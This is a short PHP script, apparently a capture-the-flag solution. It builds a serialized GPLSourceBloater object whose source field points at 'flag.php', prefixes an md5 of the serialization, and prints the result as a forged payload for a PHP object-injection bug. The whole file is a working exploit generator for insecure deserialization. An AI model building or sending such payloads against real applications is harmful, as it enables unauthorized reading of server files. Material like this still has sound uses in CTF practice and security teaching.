<?php
Class GPLSourceBloater{
}
$s = new GPLSourceBloater();
$s->source="flag.php";
$todos=[];
$todos[1]=$s;
$m = serialize($todos);
$h = md5($m);
echo $h.$m
?>
